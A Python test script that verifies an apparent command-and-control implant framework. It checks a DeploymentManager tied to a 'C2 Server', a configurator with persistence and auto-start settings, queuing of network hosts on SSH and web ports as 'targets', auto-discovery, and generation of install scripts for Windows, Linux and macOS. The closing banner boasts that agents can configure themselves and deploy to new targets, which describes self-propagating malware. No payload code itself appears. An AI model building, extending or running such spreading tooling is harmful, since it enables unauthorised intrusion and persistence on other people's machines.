#!/usr/bin/env python3
"""
Test script for deployment system verification
"""

import sys
import os
import tempfile
import shutil

# Add workspace to path
sys.path.insert(0, '/workspace')

print("="*80)
print("TESTING DEPLOYMENT SYSTEM")
print("="*80)
print()

# Test 1: Import deployment manager
print("[TEST 1] Importing DeploymentManager...")
try:
    from agent.deployment_manager import DeploymentManager, DeploymentTarget, DeploymentPackage
    print("✅ DeploymentManager imported successfully")
except ImportError as e:
    print(f"❌ Failed to import DeploymentManager: {e}")
    sys.exit(1)

# Test 2: Import auto configurator
print("\n[TEST 2] Importing AutoConfigurator...")
try:
    from agent.auto_configurator import AutoConfigurator
    print("✅ AutoConfigurator imported successfully")
except ImportError as e:
    print(f"❌ Failed to import AutoConfigurator: {e}")
    sys.exit(1)

# Test 3: Import deployment helper
print("\n[TEST 3] Importing Deployment Helper...")
try:
    from agent.deployment_helper import (
        initialize_deployment, configure_agent, queue_deployment_target,
        get_deployment_statistics, check_deployment_status
    )
    print("✅ Deployment Helper imported successfully")
except ImportError as e:
    print(f"❌ Failed to import Deployment Helper: {e}")
    sys.exit(1)

# Test 4: Test DeploymentManager instantiation
print("\n[TEST 4] Testing DeploymentManager instantiation...")
try:
    test_agent_id = "TEST-DEPLOY-001"
    dm = DeploymentManager(test_agent_id, "localhost", 8443)
    print(f"✅ DeploymentManager created for agent: {test_agent_id}")
    print(f"   - C2 Server: localhost:8443")
    print(f"   - Max concurrent deployments: {dm.MAX_CONCURRENT_DEPLOYMENTS}")
    print(f"   - Discovery interval: {dm.AUTO_DISCOVERY_INTERVAL}s")
except Exception as e:
    print(f"❌ Failed to create DeploymentManager: {e}")
    sys.exit(1)

# Test 5: Test DeploymentTarget creation
print("\n[TEST 5] Testing DeploymentTarget creation...")
try:
    target = DeploymentTarget(
        ip_address="192.168.1.100",
        port=22,
        platform="Linux",
        hostname="test-server",
        deployment_status="pending"
    )
    print(f"✅ DeploymentTarget created: {target.ip_address}:{target.port}")
    print(f"   - Platform: {target.platform}")
    print(f"   - Hostname: {target.hostname}")
    print(f"   - Status: {target.deployment_status}")
except Exception as e:
    print(f"❌ Failed to create DeploymentTarget: {e}")
    sys.exit(1)

# Test 6: Test AutoConfigurator instantiation
print("\n[TEST 6] Testing AutoConfigurator instantiation...")
try:
    configurator = AutoConfigurator()
    print(f"✅ AutoConfigurator created")
    print(f"   - Config file: {configurator.config_file}")
except Exception as e:
    print(f"❌ Failed to create AutoConfigurator: {e}")
    sys.exit(1)

# Test 7: Test deployment package creation (simulation)
print("\n[TEST 7] Testing deployment package creation...")
try:
    # This will fail if source doesn't exist, but we can test the logic
    print("   Note: Package creation requires full source files")
    print("   Testing package structure...")
    
    # Test install script creation
    from agent.deployment_manager import DeploymentManager
    dm_test = DeploymentManager("TEST-AGENT", "localhost", 8443)
    
    # Test install script generation
    windows_install = dm_test._create_install_script("Windows", "amd64")
    if windows_install and len(windows_install) > 100:
        print("✅ Windows install script generated successfully")
    else:
        print("❌ Windows install script generation failed")
        sys.exit(1)
    
    linux_install = dm_test._create_install_script("Linux", "amd64")
    if linux_install and len(linux_install) > 100:
        print("✅ Linux install script generated successfully")
    else:
        print("❌ Linux install script generation failed")
        sys.exit(1)
    
    macos_install = dm_test._create_install_script("macOS", "amd64")
    if macos_install and len(macos_install) > 100:
        print("✅ macOS install script generated successfully")
    else:
        print("❌ macOS install script generation failed")
        sys.exit(1)
    
except Exception as e:
    print(f"❌ Failed to test package creation: {e}")
    sys.exit(1)

# Test 8: Test configuration management
print("\n[TEST 8] Testing configuration management...")
try:
    # Create temporary config file
    temp_dir = tempfile.mkdtemp()
    temp_config = os.path.join(temp_dir, "test_config.json")
    
    try:
        configurator = AutoConfigurator(config_file=temp_config)
        config = configurator._load_or_create_config("TEST-001", "localhost", 8443)
        
        # Verify required fields
        required_fields = ['agent_id', 'c2_server', 'c2_port', 'auto_start', 'persistence_enabled']
        all_present = all(field in config for field in required_fields)
        
        if all_present:
            print("✅ Configuration created successfully")
            print(f"   - Agent ID: {config['agent_id']}")
            print(f"   - C2 Server: {config['c2_server']}:{config['c2_port']}")
            print(f"   - Auto Start: {config['auto_start']}")
            print(f"   - Persistence: {config['persistence_enabled']}")
        else:
            print("❌ Configuration missing required fields")
            sys.exit(1)
            
    finally:
        # Clean up
        shutil.rmtree(temp_dir, ignore_errors=True)
        
except Exception as e:
    print(f"❌ Failed to test configuration management: {e}")
    sys.exit(1)

# Test 9: Test deployment queue
print("\n[TEST 9] Testing deployment queue...")
try:
    dm = DeploymentManager("TEST-DEPLOY-002", "localhost", 8443)
    
    # Queue multiple targets
    targets = [
        DeploymentTarget(ip_address="192.168.1.1", port=22, platform="Linux"),
        DeploymentTarget(ip_address="192.168.1.2", port=80, platform="Windows"),
        DeploymentTarget(ip_address="192.168.1.3", port=443, platform="macOS")
    ]
    
    for target in targets:
        dm.queue_deployment(target)
    
    print(f"✅ Deployment queue working")
    print(f"   - Queued {len(targets)} targets")
    print(f"   - Queue size: {len(dm.deployment_queue)}")
    
except Exception as e:
    print(f"❌ Failed to test deployment queue: {e}")
    sys.exit(1)

# Test 10: Test deployment statistics
print("\n[TEST 10] Testing deployment statistics...")
try:
    dm = DeploymentManager("TEST-DEPLOY-003", "localhost", 8443)
    stats = dm.get_deployment_stats()
    
    print(f"✅ Deployment statistics working")
    print(f"   - Agent ID: {stats['agent_id']}")
    print(f"   - Queue size: {stats['queue_size']}")
    print(f"   - Discovery enabled: {stats['discovery_enabled']}")
    
except Exception as e:
    print(f"❌ Failed to test deployment statistics: {e}")
    sys.exit(1)

# Test 11: Verify integration functions
print("\n[TEST 11] Verifying integration functions...")
try:
    from agent.deployment_helper import (
        initialize_deployment, configure_agent, queue_deployment_target,
        get_deployment_statistics, check_deployment_status,
        get_successful_deployments, get_total_deployments
    )
    
    print("✅ All integration functions available:")
    print("   - initialize_deployment")
    print("   - configure_agent")
    print("   - queue_deployment_target")
    print("   - get_deployment_statistics")
    print("   - check_deployment_status")
    print("   - get_successful_deployments")
    print("   - get_total_deployments")
    
except Exception as e:
    print(f"❌ Failed to verify integration functions: {e}")
    sys.exit(1)

# Test 12: Test platform-specific scripts
print("\n[TEST 12] Testing platform-specific scripts...")
try:
    dm = DeploymentManager("TEST-AGENT", "localhost", 8443)
    
    platforms_archs = [
        ("Windows", "amd64"),
        ("Windows", "x86"),
        ("Linux", "amd64"),
        ("Linux", "arm64"),
        ("macOS", "amd64"),
        ("macOS", "arm64")
    ]
    
    for platform, arch in platforms_archs:
        try:
            install_script = dm._create_install_script(platform, arch)
            uninstall_script = dm._create_uninstall_script(platform, arch)
            
            if len(install_script) > 50 and len(uninstall_script) > 50:
                print(f"   ✅ {platform}-{arch} scripts generated")
            else:
                print(f"   ❌ {platform}-{arch} scripts too short")
                sys.exit(1)
        except Exception as e:
            print(f"   ❌ {platform}-{arch} generation failed: {e}")
            sys.exit(1)
    
    print("✅ All platform-specific scripts generated successfully")
    
except Exception as e:
    print(f"❌ Failed to test platform-specific scripts: {e}")
    sys.exit(1)

print()
print("="*80)
print("✅ ALL TESTS PASSED")
print("="*80)
print()
print("The deployment system is working correctly!")
print("Agents can now:")
print("  - Create multi-platform deployment packages")
print("  - Automatically configure themselves")
print("  - Queue and deploy to new targets")
print("  - Monitor deployment status")
print("  - Track deployment statistics")
print()